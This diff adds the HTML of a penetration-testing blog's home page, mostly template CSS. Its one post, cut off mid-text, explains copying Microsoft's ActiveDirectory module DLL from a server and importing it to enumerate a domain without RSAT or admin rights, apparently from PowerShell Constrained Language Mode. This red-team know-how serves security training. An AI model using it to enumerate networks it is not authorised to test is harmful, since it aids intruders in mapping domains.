@@ -1,0 +1,3151 @@
+<!DOCTYPE html>
+<html class='v2' dir='ltr' lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='https://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/1938605287-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
+<meta content='width=1100' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='https://www.labofapenetrationtester.com/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='http://www.labofapenetrationtester.com/' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="Lab of a Penetration Tester - Atom" href="https://www.labofapenetrationtester.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Lab of a Penetration Tester - RSS" href="https://www.labofapenetrationtester.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Lab of a Penetration Tester - Atom" href="https://www.blogger.com/feeds/8135211063584500909/posts/default" />
+<link rel="me" href="https://www.blogger.com/profile/02092541175521734123" />
+<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1953397912-ieretrofit.js"></script>
+<![endif]-->
+<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' name='description'/>
+<meta content='http://www.labofapenetrationtester.com/' property='og:url'/>
+<meta content='Lab of a Penetration Tester' property='og:title'/>
+<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' property='og:description'/>
+<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
+<title>Lab of a Penetration Tester</title>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Template Style
+Name:     Awesome Inc.
+Designer: Tina Chen
+URL:      tinachen.org
+----------------------------------------------- */
+
+/* Content
+----------------------------------------------- */
+body {
+font: normal normal 16px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+background: #eeeeee none repeat scroll top left;
+}
+html body .content-outer {
+min-width: 0;
+max-width: 100%;
+width: 100%;
+}
+a:link {
+text-decoration: none;
+color: #3778cd;
+}
+a:visited {
+text-decoration: none;
+color: #4d469c;
+}
+a:hover {
+text-decoration: underline;
+color: #3778cd;
+}
+.body-fauxcolumn-outer .cap-top {
+position: absolute;
+z-index: 1;
+height: 276px;
+width: 100%;
+background: transparent none repeat-x scroll top left;
+_background-image: none;
+}
+/* Columns
+----------------------------------------------- */
+.content-inner {
+padding: 0;
+}
+.header-inner .section {
+margin: 0 16px;
+}
+.tabs-inner .section {
+margin: 0 16px;
+}
+.main-inner {
+padding-top: 30px;
+}
+.main-inner .column-center-inner,
+.main-inner .column-left-inner,
+.main-inner .column-right-inner {
+padding: 0 5px;
+}
+*+html body .main-inner .column-center-inner {
+margin-top: -30px;
+}
+#layout .main-inner .column-center-inner {
+margin-top: 0;
+}
+/* Header
+----------------------------------------------- */
+.header-outer {
+margin: 0 0 0 0;
+background: transparent none repeat scroll 0 0;
+}
+.Header h1 {
+font: normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+text-shadow: 0 0 -1px #000000;
+}
+.Header h1 a {
+color: #222222;
+}
+.Header .description {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+}
+.header-inner .Header .titlewrapper,
+.header-inner .Header .descriptionwrapper {
+padding-left: 0;
+padding-right: 0;
+margin-bottom: 0;
+}
+.header-inner .Header .titlewrapper {
+padding-top: 22px;
+}
+/* Tabs
+----------------------------------------------- */
+.tabs-outer {
+overflow: hidden;
+position: relative;
+background: #eeeeee url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
+}
+#layout .tabs-outer {
+overflow: visible;
+}
+.tabs-cap-top, .tabs-cap-bottom {
+position: absolute;
+width: 100%;
+border-top: 1px solid #999999;
+}
+.tabs-cap-bottom {
+bottom: 0;
+}
+.tabs-inner .widget li a {
+display: inline-block;
+margin: 0;
+padding: .6em 1.5em;
+font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+border-top: 1px solid #999999;
+border-bottom: 1px solid #999999;
+border-left: 1px solid #999999;
+height: 16px;
+line-height: 16px;
+}
+.tabs-inner .widget li:last-child a {
+border-right: 1px solid #999999;
+}
+.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
+background: #666666 url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat-x scroll 0 -100px;
+color: #ffffff;
+}
+/* Headings
+----------------------------------------------- */
+h2 {
+font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+}
+/* Widgets
+----------------------------------------------- */
+.main-inner .section {
+margin: 0 27px;
+padding: 0;
+}
+.main-inner .column-left-outer,
+.main-inner .column-right-outer {
+margin-top: 0;
+}
+#layout .main-inner .column-left-outer,
+#layout .main-inner .column-right-outer {
+margin-top: 0;
+}
+.main-inner .column-left-inner,
+.main-inner .column-right-inner {
+background: transparent none repeat 0 0;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+#layout .main-inner .column-left-inner,
+#layout .main-inner .column-right-inner {
+margin-top: 0;
+}
+.sidebar .widget {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+}
+.sidebar .widget a:link {
+color: #3778cd;
+}
+.sidebar .widget a:visited {
+color: #4d469c;
+}
+.sidebar .widget a:hover {
+color: #3778cd;
+}
+.sidebar .widget h2 {
+text-shadow: 0 0 -1px #000000;
+}
+.main-inner .widget {
+background-color: #ffffff;
+border: 1px solid #eeeeee;
+padding: 0 15px 15px;
+margin: 20px -16px;
+-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.main-inner .widget h2 {
+margin: 0 -15px;
+padding: .6em 15px .5em;
+border-bottom: 1px solid transparent;
+}
+.footer-inner .widget h2 {
+padding: 0 0 .4em;
+border-bottom: 1px solid transparent;
+}
+.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
+border-top: 1px solid #eeeeee;
+padding-top: 8px;
+}
+.main-inner .widget .widget-content {
+margin: 0 -15px;
+padding: 7px 15px 0;
+}
+.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
+margin: -8px -15px 0;
+padding: 0;
+list-style: none;
+}
+.main-inner .widget #ArchiveList {
+margin: -8px 0 0;
+}
+.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
+padding: .5em 15px;
+text-indent: 0;
+color: #666666;
+border-top: 1px solid #eeeeee;
+border-bottom: 1px solid transparent;
+}
+.main-inner .widget #ArchiveList ul li {
+padding-top: .25em;
+padding-bottom: .25em;
+}
+.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
+border-top: none;
+}
+.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
+border-bottom: none;
+}
+.post-body {
+position: relative;
+}
+.main-inner .widget .post-body ul {
+padding: 0 2.5em;
+margin: .5em 0;
+list-style: disc;
+}
+.main-inner .widget .post-body ul li {
+padding: 0.25em 0;
+margin-bottom: .25em;
+color: #222222;
+border: none;
+}
+.footer-inner .widget ul {
+padding: 0;
+list-style: none;
+}
+.widget .zippy {
+color: #666666;
+}
+/* Posts
+----------------------------------------------- */
+body .main-inner .Blog {
+padding: 0;
+margin-bottom: 1em;
+background-color: transparent;
+border: none;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+}
+.main-inner .section:last-child .Blog:last-child {
+padding: 0;
+margin-bottom: 1em;
+}
+.main-inner .widget h2.date-header {
+margin: 0 -15px 1px;
+padding: 0 0 0 0;
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #444444;
+background: transparent none no-repeat scroll top left;
+border-top: 0 solid #eeeeee;
+border-bottom: 1px solid transparent;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius: 0;
+position: static;
+bottom: 100%;
+right: 15px;
+text-shadow: 0 0 -1px #000000;
+}
+.main-inner .widget h2.date-header span {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+display: block;
+padding: .5em 15px;
+border-left: 0 solid #eeeeee;
+border-right: 0 solid #eeeeee;
+}
+.date-outer {
+position: relative;
+margin: 30px 0 20px;
+padding: 0 15px;
+background-color: #ffffff;
+border: 1px solid #eeeeee;
+-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.date-outer:first-child {
+margin-top: 0;
+}
+.date-outer:last-child {
+margin-bottom: 20px;
+-moz-border-radius-bottomleft: 0;
+-moz-border-radius-bottomright: 0;
+-webkit-border-bottom-left-radius: 0;
+-webkit-border-bottom-right-radius: 0;
+-goog-ms-border-bottom-left-radius: 0;
+-goog-ms-border-bottom-right-radius: 0;
+border-bottom-left-radius: 0;
+border-bottom-right-radius: 0;
+}
+.date-posts {
+margin: 0 -15px;
+padding: 0 15px;
+clear: both;
+}
+.post-outer, .inline-ad {
+border-top: 1px solid #eeeeee;
+margin: 0 -15px;
+padding: 15px 15px;
+}
+.post-outer {
+padding-bottom: 10px;
+}
+.post-outer:first-child {
+padding-top: 0;
+border-top: none;
+}
+.post-outer:last-child, .inline-ad:last-child {
+border-bottom: none;
+}
+.post-body {
+position: relative;
+}
+.post-body img {
+padding: 8px;
+background: transparent;
+border: 1px solid transparent;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+border-radius: 0;
+}
+h3.post-title, h4 {
+font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+}
+h3.post-title a {
+font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #222222;
+}
+h3.post-title a:hover {
+color: #3778cd;
+text-decoration: underline;
+}
+.post-header {
+margin: 0 0 1em;
+}
+.post-body {
+line-height: 1.4;
+}
+.post-outer h2 {
+color: #222222;
+}
+.post-footer {
+margin: 1.5em 0 0;
+}
+#blog-pager {
+padding: 15px;
+font-size: 120%;
+background-color: #ffffff;
+border: 1px solid #eeeeee;
+-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+-goog-ms-border-top-left-radius: 0;
+-goog-ms-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius-topright: 0;
+margin-top: 1em;
+}
+.blog-feeds, .post-feeds {
+margin: 1em 0;
+text-align: center;
+color: #222222;
+}
+.blog-feeds a, .post-feeds a {
+color: #3778cd;
+}
+.blog-feeds a:visited, .post-feeds a:visited {
+color: #4d469c;
+}
+.blog-feeds a:hover, .post-feeds a:hover {
+color: #3778cd;
+}
+.post-outer .comments {
+margin-top: 2em;
+}
+/* Comments
+----------------------------------------------- */
+.comments .comments-content .icon.blog-author {
+background-repeat: no-repeat;
+background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
+}
+.comments .comments-content .loadmore a {
+border-top: 1px solid #999999;
+border-bottom: 1px solid #999999;
+}
+.comments .continue {
+border-top: 2px solid #999999;
+}
+/* Footer
+----------------------------------------------- */
+.footer-outer {
+margin: -20px 0 -1px;
+padding: 20px 0 0;
+color: #222222;
+overflow: hidden;
+}
+.footer-fauxborder-left {
+border-top: 1px solid #eeeeee;
+background: #ffffff none repeat scroll 0 0;
+-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+box-shadow: 0 0 20px rgba(0, 0, 0, .2);
+margin: 0 -20px;
+}
+/* Mobile
+----------------------------------------------- */
+body.mobile {
+background-size: auto;
+}
+.mobile .body-fauxcolumn-outer {
+background: transparent none repeat scroll top left;
+}
+*+html body.mobile .main-inner .column-center-inner {
+margin-top: 0;
+}
+.mobile .main-inner .widget {
+padding: 0 0 15px;
+}
+.mobile .main-inner .widget h2 + div,
+.mobile .footer-inner .widget h2 + div {
+border-top: none;
+padding-top: 0;
+}
+.mobile .footer-inner .widget h2 {
+padding: 0.5em 0;
+border-bottom: none;
+}
+.mobile .main-inner .widget .widget-content {
+margin: 0;
+padding: 7px 0 0;
+}
+.mobile .main-inner .widget ul,
+.mobile .main-inner .widget #ArchiveList ul.flat {
+margin: 0 -15px 0;
+}
+.mobile .main-inner .widget h2.date-header {
+right: 0;
+}
+.mobile .date-header span {
+padding: 0.4em 0;
+}
+.mobile .date-outer:first-child {
+margin-bottom: 0;
+border: 1px solid #eeeeee;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+-goog-ms-border-top-left-radius: 0;
+-goog-ms-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius: 0;
+}
+.mobile .date-outer {
+border-color: #eeeeee;
+border-width: 0 1px 1px;
+}
+.mobile .date-outer:last-child {
+margin-bottom: 0;
+}
+.mobile .main-inner {
+padding: 0;
+}
+.mobile .header-inner .section {
+margin: 0;
+}
+.mobile .post-outer, .mobile .inline-ad {
+padding: 5px 0;
+}
+.mobile .tabs-inner .section {
+margin: 0 10px;
+}
+.mobile .main-inner .widget h2 {
+margin: 0;
+padding: 0;
+}
+.mobile .main-inner .widget h2.date-header span {
+padding: 0;
+}
+.mobile .main-inner .widget .widget-content {
+margin: 0;
+padding: 7px 0 0;
+}
+.mobile #blog-pager {
+border: 1px solid transparent;
+background: #ffffff none repeat scroll 0 0;
+}
+.mobile .main-inner .column-left-inner,
+.mobile .main-inner .column-right-inner {
+background: transparent none repeat 0 0;
+-moz-box-shadow: none;
+-webkit-box-shadow: none;
+-goog-ms-box-shadow: none;
+box-shadow: none;
+}
+.mobile .date-posts {
+margin: 0;
+padding: 0;
+}
+.mobile .footer-fauxborder-left {
+margin: 0;
+border-top: inherit;
+}
+.mobile .main-inner .section:last-child .Blog:last-child {
+margin-bottom: 0;
+}
+.mobile-index-contents {
+color: #222222;
+}
+.mobile .mobile-link-button {
+background: #3778cd url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
+}
+.mobile-link-button a:link, .mobile-link-button a:visited {
+color: #ffffff;
+}
+.mobile .tabs-inner .PageList .widget-content {
+background: transparent;
+border-top: 1px solid;
+border-color: #999999;
+color: #222222;
+}
+.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
+border-left: 1px solid #999999;
+}
+
+--></style>
+<style id='template-skin-1' type='text/css'><!--
+body {
+min-width: 960px;
+}
+.content-outer, .content-fauxcolumn-outer, .region-inner {
+min-width: 960px;
+max-width: 960px;
+_width: 960px;
+}
+.main-inner .columns {
+padding-left: 0;
+padding-right: 310px;
+}
+.main-inner .fauxcolumn-center-outer {
+left: 0;
+right: 310px;
+/* IE6 does not respect left and right together */
+_width: expression(this.parentNode.offsetWidth -
+parseInt("0") -
+parseInt("310px") + 'px');
+}
+.main-inner .fauxcolumn-left-outer {
+width: 0;
+}
+.main-inner .fauxcolumn-right-outer {
+width: 310px;
+}
+.main-inner .column-left-outer {
+width: 0;
+right: 100%;
+margin-left: -0;
+}
+.main-inner .column-right-outer {
+width: 310px;
+margin-right: -310px;
+}
+#layout {
+min-width: 0;
+}
+#layout .content-outer {
+min-width: 0;
+width: 800px;
+}
+#layout .region-inner {
+min-width: 0;
+width: auto;
+}
+body#layout div.add_widget {
+padding: 8px;
+}
+body#layout div.add_widget a {
+margin-left: 32px;
+}
+--></style>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8135211063584500909&amp;zx=e1049c2b-9ebd-4bb3-afe9-ba7f0e6d16b9' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8135211063584500909&amp;zx=e1049c2b-9ebd-4bb3-afe9-ba7f0e6d16b9' rel='stylesheet'/></noscript>
+
+</head>
+<body class='loading variant-light'>
+<div class='navbar section' id='navbar' name='Navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"></div>
+<script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d8135211063584500909\x26blogName\x3dLab+of+a+Penetration+Tester\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://www.labofapenetrationtester.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttps://www.labofapenetrationtester.com/\x26vt\x3d-310815049146849363',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe"
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div></div>
+<div itemscope='itemscope' itemtype='http://schema.org/Blog' style='display: none;'>
+<meta content='Lab of a Penetration Tester' itemprop='name'/>
+<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' itemprop='description'/>
+</div>
+<div class='body-fauxcolumns'>
+<div class='fauxcolumn-outer body-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content'>
+<div class='content-fauxcolumns'>
+<div class='fauxcolumn-outer content-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content-outer'>
+<div class='content-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left content-fauxborder-left'>
+<div class='fauxborder-right content-fauxborder-right'></div>
+<div class='content-inner'>
+<header>
+<div class='header-outer'>
+<div class='header-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left header-fauxborder-left'>
+<div class='fauxborder-right header-fauxborder-right'></div>
+<div class='region-inner header-inner'>
+<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='title'>
+Lab of a Penetration Tester
+</h1>
+</div>
+<div class='descriptionwrapper'>
+<p class='description'><span>Home of Nikhil "SamratAshok" Mittal</span></p>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='header-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</header>
+<div class='tabs-outer'>
+<div class='tabs-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left tabs-fauxborder-left'>
+<div class='fauxborder-right tabs-fauxborder-right'></div>
+<div class='region-inner tabs-inner'>
+<div class='tabs section' id='crosscol' name='Cross-Column'><div class='widget PageList' data-version='1' id='PageList1'>
+<h2>Pages</h2>
+<div class='widget-content'>
+<ul>
+<li class='selected'>
+<a href='https://www.labofapenetrationtester.com/'>Home</a>
+</li>
+<li>
+<a href='https://www.labofapenetrationtester.com/p/about-me.html'>About Me</a>
+</li>
+<li>
+<a href='https://www.labofapenetrationtester.com/p/blog-page.html'>Presentations</a>
+</li>
+<li>
+<a href='https://www.labofapenetrationtester.com/p/trainings.html'>Trainings</a>
+</li>
+</ul>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=PageList&widgetId=PageList1&action=editWidget&sectionId=crosscol' onclick='return _WidgetManager._PopupConfig(document.getElementById("PageList1"));' rel='nofollow' target='configPageList1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div></div>
+<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
+</div>
+</div>
+<div class='tabs-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='main-outer'>
+<div class='main-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left main-fauxborder-left'>
+<div class='fauxborder-right main-fauxborder-right'></div>
+<div class='region-inner main-inner'>
+<div class='columns fauxcolumns'>
+<div class='fauxcolumn-outer fauxcolumn-center-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-left-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-right-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<!-- corrects IE6 width calculation -->
+<div class='columns-inner'>
+<div class='column-center-outer'>
+<div class='column-center-inner'>
+<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Wednesday, October 31, 2018</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://1.bp.blogspot.com/-OFnssSTZQc0/W9nbnkq6ioI/AAAAAAAAE1I/xAhZ4fy9k3Uu-j_TgoUJ8VM5T3s-mXlJwCLcBGAs/s400/AD_Module.png' itemprop='image_url'/>
+<meta content='8135211063584500909' itemprop='blogId'/>
+<meta content='7401494977220498300' itemprop='postId'/>
+<a name='7401494977220498300'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+<a href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'>Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode</a>
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-7401494977220498300' itemprop='articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+This is a quick post to make notes of something which I have been using and teaching for sometime.<br />
+<br />
+We can use Micorosft's PowerShell ActiveDirectory module without RSAT and administrative privileges. I came to know about this from <a href="https://janikvonrotz.ch/2015/09/09/deploy-powershell-activedirectory-module-without-installing-the-remote-server-tools/">this blog post</a>.<br />
+<br />
+So, if you have access to a Server which has the module installed (like a DC), copy the Microsoft.ActiveDirectory.Management.dll from C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management to your own machine and then use the Import-Module cmdlet to import the DLL:<br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
+</textarea></pre>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-OFnssSTZQc0/W9nbnkq6ioI/AAAAAAAAE1I/xAhZ4fy9k3Uu-j_TgoUJ8VM5T3s-mXlJwCLcBGAs/s1600/AD_Module.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="668" data-original-width="1600" height="166" src="https://1.bp.blogspot.com/-OFnssSTZQc0/W9nbnkq6ioI/AAAAAAAAE1I/xAhZ4fy9k3Uu-j_TgoUJ8VM5T3s-mXlJwCLcBGAs/s400/AD_Module.png" width="400" /></a></div>
+Please note that if you run Get-Command -Module ActiveDirectory, it would not return anything. To get that, copy the module directory as well from the server from following location: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\. Then, use Import-Module, first the DLL and then the module:<br />
+<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
+PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
+PS C:\> Get-Command -Module ActiveDirectory
+</textarea></pre>
+UPDATE (16-Nov-2018) - It is now possible to load the module from memory by using Import-ActiveDirectory.ps1. Thanks to a PR by @D1iv3: <br />
+<div class="separator" style="clear: both; text-align: center;">
